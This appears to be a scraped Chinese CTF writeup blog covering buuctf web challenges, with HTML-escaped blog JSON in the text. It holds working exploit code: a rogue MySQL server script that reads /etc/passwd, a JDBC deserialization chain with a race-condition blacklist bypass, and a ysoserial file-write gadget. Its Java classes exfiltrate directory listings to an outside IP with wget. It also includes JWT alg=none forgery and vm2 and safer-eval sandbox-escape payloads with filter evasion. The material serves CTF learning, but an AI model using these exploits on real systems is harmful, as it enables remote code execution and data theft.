0\\x00\\x00\\x00\\x28\\x00\\x00\\x0c\\x03\\x64\\x65\\x66\\x00\\x00\\x00\\x12\\x6d\\x61\\x78\\x5f\\x61\\x6c\\x6c\\x6f\\x77\\x65\\x64\\x5f\\x70\\x61\\x63\\x6b\\x65\\x74\\x00\\x0c\\x3f\\x00\\x15\\x00\\x00\\x00\\x08\\xa0\\x00\\x00\\x00\\x00\\x27\\x00\\x00\\x0d\\x03\\x64\\x65\\x66\\x00\\x00\\x00\\x11\\x6e\\x65\\x74\\x5f\\x62\\x75\\x66\\x66\\x65\\x72\\x5f\\x6c\\x65\\x6e\\x67\\x74\\x68\\x00\\x0c\\x3f\\x00\\x15\\x00\\x00\\x00\\x08\\xa0\\x00\\x00\\x00\\x00\\x27\\x00\\x00\\x0e\\x03\\x64\\x65\\x66\\x00\\x00\\x00\\x11\\x6e\\x65\\x74\\x5f\\x77\\x72\\x69\\x74\\x65\\x5f\\x74\\x69\\x6d\\x65\\x6f\\x75\\x74\\x00\\x0c\\x3f\\x00\\x15\\x00\\x00\\x00\\x08\\xa0\\x00\\x00\\x00\\x00\\x26\\x00\\x00\\x0f\\x03\\x64\\x65\\x66\\x00\\x00\\x00\\x10\\x71\\x75\\x65\\x72\\x79\\x5f\\x63\\x61\\x63\\x68\\x65\\x5f\\x73\\x69\\x7a\\x65\\x00\\x0c\\x3f\\x00\\x15\\x00\\x00\\x00\\x08\\xa0\\x00\\x00\\x00\\x00\\x26\\x00\\x00\\x10\\x03\\x64\\x65\\x66\\x00\\x00\\x00\\x10\\x71\\x75\\x65\\x72\\x79\\x5f\\x63\\x61\\x63\\x68\\x65\\x5f\\x74\\x79\\x70\\x65\\x00\\x0c\\x21\\x00\\x09\\x00\\x00\\x00\\xfd\\x00\\x00\\x1f\\x00\\x00\\x1e\\x00\\x00\\x11\\x03\\x64\\x65\\x66\\x00\\x00\\x00\\x08\\x73\\x71\\x6c\\x5f\\x6d\\x6f\\x64\\x65\\x00\\x0c\\x21\\x00\\x9b\\x01\\x00\\x00\\xfd\\x00\\x00\\x1f\\x00\\x00\\x26\\x00\\x00\\x12\\x03\\x64\\x65\\x66\\x00\\x00\\x00\\x10\\x73\\x79\\x73\\x74\\x65\\x6d\\x5f\\x74\\x69\\x6d\\x65\\x5f\\x7a\\x6f\\x6e\\x65\\x00\\x0c\\x21\\x00\\x09\\x00\\x00\\x00\\xfd\\x00\\x00\\x1f\\x00\\x00\\x1f\\x00\\x00\\x13\\x03\\x64\\x65\\x66\\x00\\x00\\x00\\x09\\x74\\x69\\x6d\\x65\\x5f\\x7a\\x6f\\x6e\\x65\\x00\\x0c\\x21\\x00\\x12\\x00\\x00\\x00\\xfd\\x00\\x00\\x1f\\x00\\x00\\x2b\\x00\\x00\\x14\\x03\\x64\\x65\\x66\\x00\\x00\\x00\\x15\\x74\\x72\\x61\\x6e\\x73\\x61\\x63\\x74\\x69\\x6f\\x6e\\x5f\\x69\\x73\\x6f\\x6c\\x61\\x74\\x69\\x6f\\x6e\\x00\\x0c\\x21\\x00\\x2d\\x00\\x00\\x00\\xfd\\x00\\x00\\x1f\\x00\\x00\\x22\\x00\\x00\\x15\\x03\\x64\\x65\\x66\\x00\\x00\\x00\\x0c\\x77\\x61\\x69\\x74\\x5f\\x74\\x69\\x6d\\x65\\x6f\\x75\\x74\\x00\\x0c\\x3f\\x00\\x15\\x00\\x00\\x00\\x08\\xa0\\x00\\x00\\x00\\x00\\xff\\x00\\x00\\x16\\x01\\x31\\x04\\x75\\x74\\x66\\x38\\x04\\x75\\x74\\x66\\x38\\x04\\x75\\x74\\x66\\x38\\x06\\x6c\\x61\\x74\\x69\\x6e\\x31\\x11\\x6c\\x61\\x74\\x69\\x6e\\x31\\x5f\\x73\\x77\\x65\\x64\\x69\\x73\\x68\\x5f\\x63\\x69\\x00\\x05\\x32\\x38\\x38\\x30\\x30\\x03\\x47\\x50\\x4c\\x01\\x30\\x07\\x34\\x31\\x39\\x34\\x33\\x30\\x34\\x05\\x31\\x36\\x33\\x38\\x34\\x02\\x36\\x30\\x07\\x31\\x30\\x34\\x38\\x35\\x37\\x36\\x03\\x4f\\x46\\x46\\x89\\x4f\\x4e\\x4c\\x59\\x5f\\x46\\x55\\x4c\\x4c\\x5f\\x47\\x52\\x4f\\x55\\x50\\x5f\\x42\\x59\\x2c\\x53\\x54\\x52\\x49\\x43\\x54\\x5f\\x54\\x52\\x41\\x4e\\x53\\x5f\\x54\\x41\\x42\\x4c\\x45\\x53\\x2c\\x4e\\x4f\\x5f\\x5a\\x45\\x52\\x4f\\x5f\\x49\\x4e\\x5f\\x44\\x41\\x54\\x45\\x2c\\x4e\\x4f\\x5f\\x5a\\x45\\x52\\x4f\\x5f\\x44\\x41\\x54\\x45\\x2c\\x45\\x52\\x52\\x4f\\x52\\x5f\\x46\\x4f\\x52\\x5f\\x44\\x49\\x56\\x49\\x53\\x49\\x4f\\x4e\\x5f\\x42\\x59\\x5f\\x5a\\x45\\x52\\x4f\\x2c\\x4e\\x4f\\x5f\\x41\\x55\\x54\\x4f\\x5f\\x43\\x52\\x45\\x41\\x54\\x45\\x5f\\x55\\x53\\x45\\x52\\x2c\\x4e\\x4f\\x5f\\x45\\x4e\\x47\\x49\\x4e\\x45\\x5f\\x53\\x55\\x42\\x53\\x54\\x49\\x54\\x55\\x54\\x49\\x4f\\x4e\\x03\\x55\\x54\\x43\\x06\\x53\\x59\\x53\\x54\\x45\\x4d\\x0f\\x52\\x45\\x50\\x45\\x41\\x54\\x41\\x42\\x4c\\x45\\x2d\\x52\\x45\\x41\\x44\\x05\\x32\\x38\\x38\\x30\\x30\\x07\\x00\\x00\\x17\\xfe\\x00\\x00\\x02\\x00\\x02\\x00&quot;conn.sendall(aaa)content = conn.recv(9999)# wantfile = &quot;\\x0c\\x00\\x00\\x01\\xfb\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64&quot;wantfile = chr(len(filename) + 1) + &quot;\\x00\\x00\\x01\\xFB&quot; + filenameprint(&quot;read file...&quot;)print(&quot;------------\\n&quot;)conn.sendall(wantfile)content = conn.recv(9999)print(content+&quot;\\n\\n&quot;)print(&quot;base64_encode contents: %s\\n&quot;%base64.b64encode(content))print(&quot;++++++++++++\\n&quot;)conn.close()sv.close() 读取/proc/self/cmdline payload: 1&#x2F;;admin&#x2F;importData?jdbcUrl&#x3D;jdbc:mysql:&#x2F;&#x2F;1.1.1.1:3306&#x2F;mysql?useSSL&#x3D;false%26password&#x3D;root%26user&#x3D;root&amp;databaseType&#x3D;mysql 注意要设置useSSL=false &amp;要url编码 服务端成功读到文件 由此可知 该项目的class_path位于/tmp/webapp/target/classes 竞争bypass黑名单限制再看下如何bypass 黑名单检测 黑名单 1public String[] blackList = new String[] &#123;&quot;%&quot;, &quot;autoDeserialize&quot;&#125;; autoDeserialize关键字过滤了就没办法反序列化成功了 这里利用的是Servlet竞争来绕过 首先介绍一下Servlet的生命周期：https://www.runoob.com/servlet/servlet-life-cycle.html Servlet 初始化后调用 init () 方法 该方法在第一次创建 Servlet 时被调用 在后续用户请求时将不再再次调用 会使用已经实例化的Servlet Servlet 调用 service() 方法来处理客户端的请求 service() 方法检查 HTTP 请求类型（GET、POST、PUT、DELETE 等），并在适当的时候调用 doGet、doPost、doPut，doDelete 等方法 Servlet 销毁前调用 destroy() 方法 最后，Servlet 是由 JVM 的垃圾回收器进行垃圾回收的 尽管每次执行都会发生在不同的线程，但是容器中只有一个Servlet实例，如果Servlet实例内部的某个实例属性的内容会被多个线程访问并修改，就有可能导致竞争问题 看下检测的代码 单例blackListChecker对象同样也存在竞争的问题 检测的字符串设置到BlackListChecker对象的toBeChecked成员变量中 再从toBeChecked中拿出来做字符串contains检测 这里存在多个线程对同一个对象做写操作的情况 存在竞争问题 尝试构造payload 1234567payload1:&#x2F;;admin&#x2F;importData?jdbcUrl&#x3D;jdbc:mysql:&#x2F;&#x2F;1.1.1.1:3306&#x2F;mysql?useSSL&#x3D;false%26password&#x3D;root%26user&#x3D;root&amp;databaseType&#x3D;mysqlpayload2:&#x2F;;admin&#x2F;importData?jdbcUrl&#x3D;jdbc:mysql:&#x2F;&#x2F;1.1.1.1:3307&#x2F;mysql?password&#x3D;root%26user&#x3D;root%26useSSL&#x3D;false%26statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor%26autoDeserialize&#x3D;true 存在竞争问题的是this.toBeChecked 而Servlet里定义的变量jdbcUrl不存在该问题 情景如下： 请求payload2 经过BlackListChecker.check函数检测 调用setToBeChecked设置this.toBeChecked 由于只有一个BlackListChecker示例 这时候刚好请求了payload1 成功修改了this.toBeChecked 通过了检测 而变量jdbcUrl仍然是payload2 就绕过了限制 JDBC反序列化AspectJWeaver任意文件写入ysoserial里的AspectJWeaver那个gadget依赖于commons-collections:3.2.2 但是这里没有commons-collections 有一个checker/DataMap.java类 下载ysoserial源码 新建checker/DataMap.java 链先不分析 poc: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102package ysoserial.payloads;import org.apache.commons.codec.binary.Base64;import checker.DataMap;import ysoserial.payloads.annotation.Authors;import ysoserial.payloads.annotation.Dependencies;import ysoserial.payloads.annotation.PayloadTest;import ysoserial.payloads.util.PayloadRunner;import ysoserial.payloads.util.Reflections;import java.io.FileOutputStream;import java.io.ObjectOutputStream;import java.io.Serializable;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.HashMap;import java.util.HashSet;import java.util.Map;/*Gadget chain:HashSet.readObject() HashMap.put() HashMap.hash() DataMap$Entry.hashcode DataMap$Entry.getValue() DataMap.get() SimpleCache$StorableCachingMap.put() SimpleCache$StorableCachingMap.writeToPath() FileOutputStream.write()*/@PayloadTest(skip=&quot;non RCE&quot;)@SuppressWarnings(&#123;&quot;rawtypes&quot;, &quot;unchecked&quot;&#125;)@Dependencies(&#123;&quot;org.aspectj:aspectjweaver:1.9.2&quot;&#125;)@Authors(&#123;&quot;MEIZJ&quot;&#125;)public class AspectJWeaverSingle implements ObjectPayload&lt;Serializable&gt; &#123; public Serializable getObject(final String command) throws Exception &#123; int sep = command.lastIndexOf(&#x27;;&#x27;); if ( sep &lt; 0 ) &#123; throw new IllegalArgumentException(&quot;Command format is: &lt;filename&gt;:&lt;base64 Object&gt;&quot;); &#125; String[] parts = command.split(&quot;;&quot;); String filename = parts[0]; byte[] content = Base64.decodeBase64(parts[1]); Constructor aspectjConstructor = Reflections.getFirstCtor(&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;); Reflections.setAccessible(aspectjConstructor); Object simpleCache = aspectjConstructor.newInstance(&quot;.&quot;,12); HashMap wrapperMap = new HashMap(); wrapperMap.put(filename,content); DataMap dataMap = new DataMap(wrapperMap,(Map)simpleCache); Constructor dataMapEntryConstructor = Reflections.getFirstCtor(&quot;checker.DataMap$Entry&quot;); Reflections.setAccessible(dataMapEntryConstructor); Object dataMapEntry = dataMapEntryConstructor.newInstance(dataMap,filename); HashSet map = new HashSet(1); map.add(&quot;foo&quot;); Field f = null; try &#123; f = HashSet.class.getDeclaredField(&quot;map&quot;); &#125; catch (NoSuchFieldException e) &#123; f = HashSet.class.getDeclaredField(&quot;backingMap&quot;); &#125; Reflections.setAccessible(f); HashMap innimpl = (HashMap) f.get(map); Field f2 = null; try &#123; f2 = HashMap.class.getDeclaredField(&quot;table&quot;); &#125; catch (NoSuchFieldException e) &#123; f2 = HashMap.class.getDeclaredField(&quot;elementData&quot;); &#125; Reflections.setAccessible(f2); Object[] array = (Object[]) f2.get(innimpl); Object node = array[0]; if(node == null)&#123; node = array[1]; &#125; Field keyField = null; try&#123; keyField = node.getClass().getDeclaredField(&quot;key&quot;); &#125;catch(Exception e)&#123; keyField = Class.forName(&quot;java.util.MapEntry&quot;).getDeclaredField(&quot;key&quot;); &#125; Reflections.setAccessible(keyField); keyField.set(node, dataMapEntry); return map; &#125; public static void main(String[] args) throws Exception &#123; String aaa = &quot;/test.txt;ZmlsZSB3cml0ZSB0ZXN0&quot;; ObjectOutputStream o = new ObjectOutputStream(new FileOutputStream(&quot;obj.ser&quot;)); o.writeObject((new AspectJWeaverSingle()).getObject(aaa)); o.close(); &#125;&#125; 运行生成obj.ser 上传至rogue_mysql 运行rogue_mysql 配置文件如下 payload: 1&#x2F;;admin&#x2F;importData?jdbcUrl&#x3D;jdbc:mysql:&#x2F;&#x2F;1.1.1.1:3307&#x2F;mysql?password&#x3D;root%26user&#x3D;root%26useSSL&#x3D;false%26statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor%26autoDeserialize&#x3D;true&amp;databaseType&#x3D;mysql 服务端: 现在就可以任意文件写入了 RCERCE方法： 向class_path写入.class文件 该类重写readObject方法 里面包含rce的代码 通过JDBC反序列化加载该类 exp.java: 123456789101112131415161718192021package servlet;import java.io.*;public class exp implements java.io.Serializable&#123; public String a; public exp()&#123; this.a = &quot;a&quot;; &#125; private void writeObject(ObjectInputStream oin) throws IOException, ClassNotFoundException &#123; oin.defaultReadObject(); &#125; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; in.defaultReadObject(); try&#123; Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;wget http://103.152.132.16:900/?a=$(ls /|base64 -w0&quot;&#125;); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; javac编译成class文件 获取base64形式 更换成class_path的地址 更换文件内容 生成obj.ser上传至class 写入/tmp/webapp/target/classes/servlet/exp.class 构造exp class的反序列化文件object.ser 12345678910111213141516171819202122package servlet;import java.io.*;public class exp implements Serializable&#123; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; in.defaultReadObject(); try&#123; Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;wget http://103.152.132.16:900/?a=$(ls /|base64 -w0&quot;&#125;); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void main(String[] args) throws Exception&#123; exp obj = new exp(); FileOutputStream fos = new FileOutputStream(&quot;object.ser&quot;); ObjectOutputStream os = new ObjectOutputStream(fos); os.writeObject(obj); os.close(); &#125;&#125; 还有一种方式 写入/tmp/webapp/target/classes/servlet/antInterceptor.class 12345678910111213141516171819202122232425262728293031323334353637383940414243package servlet;import com.mysql.jdbc.Connection;import com.mysql.jdbc.ResultSetInternalMethods;import com.mysql.jdbc.Statement;import com.mysql.jdbc.StatementInterceptor;import java.io.IOException;import java.sql.SQLException;import java.util.Properties;public class antInterceptor implements StatementInterceptor&#123; @Override public void init(Connection connection, Properties properties) throws SQLException &#123; &#125; @Override public ResultSetInternalMethods preProcess(String s, Statement statement, Connection connection) throws SQLException &#123; return null; &#125; @Override public ResultSetInternalMethods postProcess(String s, Statement statement, ResultSetInternalMethods resultSetInternalMethods, Connection connection) throws SQLException &#123; try &#123; Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;wget http://103.152.132.16:900/?a=$(ls /|base64 -w0&quot;&#125;); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return null; &#125; @Override public boolean executeTopLevelOnly() &#123; return false; &#125; @Override public void destroy() &#123; &#125;&#125; 编译该文件 使用 1javac -cp mysql-connector-java-5.1.48.jar antInterceptor.java 利用任意文件写入写入该文件 加载时的payload 1&#x2F;;admin&#x2F;importData?jdbcUrl&#x3D;jdbc:mysql:&#x2F;&#x2F;103.152.132.16:3307&#x2F;mysql?password&#x3D;root%26user&#x3D;root%26useSSL&#x3D;false%26statementInterceptors&#x3D;servlet.antInterceptor%26autoDeserialize&#x3D;true&amp;databaseType&#x3D;mysql 原理就是使用一个继承了interceptor接口的恶意类，再通过interceptor自动执行特定函数这个特点进行RCE","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"}]},{"title":"buuctf刷题-Nodejs篇","slug":"buuctf刷题-Nodejs篇","date":"2020-01-16T06:02:52.000Z","updated":"2021-03-12T04:27:42.342Z","comments":true,"path":"2020/01/16/buuctf刷题-Nodejs篇/","link":"","permalink":"http://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Nodejs%E7%AF%87/","excerpt":"本篇博客主要记录了buuctf上web部分Node.js相关题目的writeup！持续更新！","text":"本篇博客主要记录了buuctf上web部分Node.js相关题目的writeup！持续更新！ [HFCTF2020]EasyLoginwriteup查看源码 发现/static/js/app.js里 这意思不就是知道知道路径能直接访问到源码吗？ koa框架目录结构可以参考这篇文章：https://blog.suevily.cn/58225/#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84 访问/controllers/api.js得到 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586const crypto = require(&#x27;crypto&#x27;);const fs = require(&#x27;fs&#x27;)const jwt = require(&#x27;jsonwebtoken&#x27;)const APIError = require(&#x27;../rest&#x27;).APIError;module.exports = &#123; &#x27;POST /api/register&#x27;: async (ctx, next) =&gt; &#123; const &#123;username, password&#125; = ctx.request.body; if(!username || username === &#x27;admin&#x27;)&#123; throw new APIError(&#x27;register error&#x27;, &#x27;wrong username&#x27;); &#125; if(global.secrets.length &gt; 100000) &#123; global.secrets = []; &#125; const secret = crypto.randomBytes(18).toString(&#x27;hex&#x27;); const secretid = global.secrets.length; global.secrets.push(secret) const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;); ctx.rest(&#123; token: token &#125;); await next(); &#125;, &#x27;POST /api/login&#x27;: async (ctx, next) =&gt; &#123; const &#123;username, password&#125; = ctx.request.body; if(!username || !password) &#123; throw new APIError(&#x27;login error&#x27;, &#x27;username or password is necessary&#x27;); &#125; const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split(&#x27;.&#x27;)[1], &#x27;base64&#x27;).toString()).secretid; console.log(sid) if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123; throw new APIError(&#x27;login error&#x27;, &#x27;no such secret id&#x27;); &#125; const secret = global.secrets[sid]; const user = jwt.verify(token, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;); const status = username === user.username &amp;&amp; password === user.password; if(status) &#123; ctx.session.username = username; &#125; ctx.rest(&#123; status &#125;); await next(); &#125;, &#x27;GET /api/flag&#x27;: async (ctx, next) =&gt; &#123; if(ctx.session.username !== &#x27;admin&#x27;)&#123; throw new APIError(&#x27;permission error&#x27;, &#x27;permission denied&#x27;); &#125; const flag = fs.readFileSync(&#x27;/flag&#x27;).toString(); ctx.rest(&#123; flag &#125;); await next(); &#125;, &#x27;GET /api/logout&#x27;: async (ctx, next) =&gt; &#123; ctx.session.username = null; ctx.rest(&#123; status: true &#125;) await next(); &#125;&#125;; 注册登陆抓包 看到jwt 解密 算法置为none绕过 123456789101112import jwttoken = jwt.encode(&#123; &quot;secretid&quot;: [], &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;123456&quot;, &quot;iat&quot;: 1615273798&#125;,algorithm=&quot;none&quot;,key=&quot;&quot;).decode(encoding=&#x27;utf-8&#x27;)print(token) 接着访问/api/flag就行了 这里涉及nodejs弱类型 123if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123; throw new APIError(&#x27;login error&#x27;, &#x27;no such secret id&#x27;);&#125; 这里将sid设置成数组了 空数组弱等于0 测试如下： 总结： 空数组弱等于数字0 只有一个数字元素或者数字字符串元素的数组弱等于数字 有两个元素的数组不大于小于等于任何数字 [GKCTF2020]EZ三剑客-EzNodewriteup源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869const express = require(&#x27;express&#x27;);const bodyParser = require(&#x27;body-parser&#x27;);const saferEval = require(&#x27;safer-eval&#x27;); // 2019.7/WORKER1 找到一个很棒的库const fs = require(&#x27;fs&#x27;);const app = express();app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());// 2020.1/WORKER2 老板说为了后期方便优化app.use((req, res, next) =&gt; &#123; if (req.path === &#x27;/eval&#x27;) &#123; let delay = 60 * 1000; console.log(delay); if (Number.isInteger(parseInt(req.query.delay))) &#123; delay = Math.max(delay, parseInt(req.query.delay)); &#125; const t = setTimeout(() =&gt; next(), delay); // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事 setTimeout(() =&gt; &#123; clearTimeout(t); console.log(&#x27;timeout&#x27;); try &#123; res.send(&#x27;Timeout!&#x27;); &#125; catch (e) &#123; &#125; &#125;, 1000); &#125; else &#123; next(); &#125;&#125;);app.post(&#x27;/eval&#x27;, function (req, res) &#123; let response = &#x27;&#x27;; if (req.body.e) &#123; try &#123; response = saferEval(req.body.e); &#125; catch (e) &#123; response = &#x27;Wrong Wrong Wrong!!!!&#x27;; &#125; &#125; res.send(String(response));&#125;);// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPIapp.get(&#x27;/source&#x27;, function (req, res) &#123; res.set(&#x27;Content-Type&#x27;, &#x27;text/javascript;charset=utf-8&#x27;); res.send(fs.readFileSync(&#x27;./index.js&#x27;));&#125;);// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口app.get(&#x27;/version&#x27;, function (req, res) &#123; res.set(&#x27;Content-Type&#x27;, &#x27;text/json;charset=utf-8&#x27;); res.send(fs.readFileSync(&#x27;./package.json&#x27;));&#125;);app.get(&#x27;/&#x27;, function (req, res) &#123; res.set(&#x27;Content-Type&#x27;, &#x27;text/html;charset=utf-8&#x27;); res.send(fs.readFileSync(&#x27;./index.html&#x27;))&#125;)app.listen(80, &#x27;0.0.0.0&#x27;, () =&gt; &#123; console.log(&#x27;Start listening&#x27;)&#125;); safer-eval是存在漏洞的：https://github.com/commenthol/safer-eval/issues/10 构造成一行就是 1234(function () &#123; const process = clearImmediate.constructor(&quot;return process;&quot;)(); return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()&#125;)() 接下来关键的就是setTimeout函数了 先看下大概意思：如果路由是/eval 接收一个delay参数与60000毫秒比较 取比较大的那个作为一个一个Timeout传入另外一个setTimeout函数中 并且超时时间是1000毫秒 正常情况下肯定会超时 但是如果设置成一个特别大的数就能绕过 看下文档可知只需比2147483647大就行 可以看下文档：http://nodejs.cn/api/timers.html#timers_settimeout_callback_delay_args express next函数作用: 最终请求 [HFCTF2020]JustEscapewriteup刚开始以为是php 访问run.php能看到源码： 12345678&lt;?phpif( array_key_exists( &quot;code&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;code&#x27; ] != NULL ) &#123; $code = $_GET[&#x27;code&#x27;]; echo eval(code);&#125; else &#123; highlight_file(__FILE__);&#125;?&gt; 但是不是php的逻辑 看到headers有X-Powered-By: Express 猜测有可能是nodejs沙箱 下面这些特征也能看出来 1new Date(); 直接报错也能看出信息 1Error().stack 可以看出来是vm2沙箱 过滤了单双引号 process exec prototype constructor 反引号没过滤 poc参见：https://github.com/patriksimek/vm2/issues/225 12345678(function()&#123; TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)(); try&#123; Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1; &#125;catch(e)&#123; return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString(); &#125;&#125;)() 直接打不行 使用反引号绕过过滤 这里的.可以使用[]绕过 关键字使用反引号模板字符串绕过： https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals 12345678(function ()&#123; TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return this.proces`&#125;s`&#125;`)(); try&#123; Object.preventExtensions(Buffer.from(``)).a = 1; &#125;catch(e)&#123; return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`whoami`).toString(); &#125;&#125;)() 除此之外还可以使用join来拼接字符串 1(()=&gt;&#123; TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`] = f=&gt;f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,` `,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); try&#123; Object[`preventExtensions`](Buffer[`from`](``))[`a`] = 1; &#125;catch(e)&#123; return e[`a`](()=&gt;&#123;&#125;)[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat /flag`)[`toString`](); &#125; &#125;)() 另外还可以使用数组绕过限制 直接 12345678run.php?code=(function()&#123; TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)(); try&#123; Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1; &#125;catch(e)&#123; return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString(); &#125;&#125;)() 看下源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465const express = require(&#x27;express&#x27;);const app = express();const &#123;VM&#125; = require(&#x27;vm2&#x27;);const error = `&lt;pre style=&quot;font-family:&#x27;courier new&#x27;, typewriter, matrix, monospace;&quot;&gt;┌─────────────────────────────────────────────────────────────┐│┌───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┐│││Esc│!1 │@2 │#3 │$4 │%5 │^6 │&amp;7 │*8 │(9 │)0 │_- │+= │|\\\\ │\\`~ │││├───┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴───┤│││ Tab │ Q │ W │ E │ R │ T │ Y │ U │ I │ O │ P │&#123;[ │&#125;] │ BS │││├─────┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴─────┤│││ Ctrl │ A │ S │ D │ F │ G │ H │ J │ K │ L │: ;│&quot; &#x27;│ Enter │││├──────┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴────┬───┤│││ Shift │ Z │ X │ C │ V │ B │ N │ M │&lt; ,│&gt; .│? /│Shift │Fn │││└─────┬──┴┬──┴──┬┴───┴───┴───┴───┴───┴──┬┴───┴┬──┴┬─────┴───┘││ │Fn │ Alt │ Space │ Alt │Win│ HHKB ││ └───┴─────┴───────────────────────┴─────┴───┘ │└─────────────────────────────────────────────────────────────┘ Happy Hacking auto coding&lt;/pre&gt;`;app.use(express.static(&#x27;public&#x27;));app.get(&#x27;/&#x27;, function (req, res) &#123; res.sendFile( __dirname + &quot;/&quot; + &quot;index.html&quot; );&#125;);app.get(&#x27;/index.php&#x27;, function(req, res) &#123; res.sendFile( __dirname + &quot;/&quot; + &quot;php.html&quot; );&#125;);app.get(&#x27;/run.php&#x27;,function(req,res)&#123; const code = req.query.code; try&#123; if(!code) &#123; res.sendFile( __dirname + &quot;/&quot; + &quot;php.html&quot; ); return; &#125; const blacklists = [&#x27;for&#x27;, &#x27;while&#x27;, &#x27;process&#x27;, &#x27;exec&#x27;, &#x27;eval&#x27;, &#x27;constructor&#x27;, &#x27;prototype&#x27;, &#x27;Function&#x27;, &#x27;+&#x27;, &#x27;&quot;&#x27;,&#x27;\\&#x27;&#x27;]; if(blacklists.map(v=&gt;code.includes(v)).filter(v=&gt;v).length !== 0) &#123; res.send(error); return; &#125; const result = new VM().run(code); res.send(result.toString()); &#125; catch(ex) &#123; res.send(ex.toString()); &#125;&#125;);const server = app.listen(3000, function () &#123; const host = server.address().address; const port = server.address().port; console.log(&quot;app listening at http://%s:%s&quot;, host, port);&#125;); php.html就是php的代码高亮的html","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"}]},{"title":"buuctf刷题-Python篇","slug":"buuctf刷题-Python篇","date":"2020-01-16T06:02:32.000Z","updated":"2021-04-05T13:23:47.124Z","comments":true,"path":"2020/01/16/buuctf刷题-Python篇/","link":"","permalink":"http://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Python%E7%AF%87/","excerpt":"本篇博客主要记录了buuctf上web部分Python相关题目的writeup！持续更新！","text":"本篇博客主要记录了buuctf上web部分Python相关题目的writeup！持续更新！ [HCTF 2018]adminwriteup参考：https://www.anquanke.com/post/id/164086 打开注册登陆，在index页面看到you are not admin，在change password页面源代码里看到有个github地址 1https://github.com/woadsl1234/hctf_flask/ 下载到本地，发现是python2的flask项目，在templates/index.html看到 123&#123;% if current_user.is_authenticated and session[&#x27;name&#x27;] == &#x27;admin&#x27; %&#125;&lt;h1 class=&quot;nav&quot;&gt;hctf&#123;xxxxxxxxx&#125;&lt;/h1&gt;&#123;% endif %&#125; 